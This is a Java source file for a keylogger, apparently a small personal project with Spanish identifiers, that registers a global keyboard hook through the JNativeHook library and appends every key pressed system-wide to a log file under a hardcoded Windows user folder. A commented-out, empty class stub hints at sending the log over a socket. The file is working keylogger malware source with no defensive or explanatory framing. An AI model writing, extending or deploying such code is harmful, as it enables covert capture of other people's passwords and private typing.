package keylogger;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;


import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;


public class MainKey implements NativeKeyListener {
	private String aux = "";
	private static log keylog = new log();
	private static File ArchivoLog;
	private static boolean resultado;
	private static String appPath = "";

	public static void main(String[] args) {
		
			//appPath = new File(".").getCanonicalPath();
			appPath = new File(".").getAbsolutePath();
			System.out.println(appPath);
			
			ArchivoLog = keylog.Crealog("C:/Users/juanc/Documents");
			if(!ArchivoLog.exists()){
				resultado = ArchivoLog.mkdirs();
				System.out.println(resultado);
			}
			
			
			try {
				GlobalScreen.registerNativeHook();
			} catch (NativeHookException e) {
			
				e.printStackTrace();
			}
				GlobalScreen.getInstance().addNativeKeyListener(new MainKey());

}
	@Override
	public void nativeKeyPressed(NativeKeyEvent e) {
		aux = NativeKeyEvent.getKeyText(e.getKeyCode());
		if (!aux.equals("Intro") && !aux.equals("Retroceso") && !aux.equals("Suprimir")){
			if(aux.equals("Espacio")){
				aux = "-" + aux + "-";
			}
			System.out.print(aux);
			keylog.escribir(aux);
		}
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent e) {
		
		
	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent e) {
		
		
	}

	

}
//class enviaLog extends Thread{
//	Socket servidor = new Socket();
//	
//	public enviaLog(){
//		
//	}
//	
//	public void run(){
//		while (true){
//			
//		}
//	}
//	
//	
//}
class log{
	
	private BufferedWriter log;
	private File fileLog;
	
	public File Crealog(String s){
		 return fileLog = new File(s);
	}
	

	
	public void escribir(String s){
		
		try {
			log = new BufferedWriter(new FileWriter("C:/Users/juanc/Documents/logs/log.txt",true));
			log.write(s);
			log.close();
		} catch (IOException e) {
			
			e.printStackTrace();
		}
		
		
	}
	
}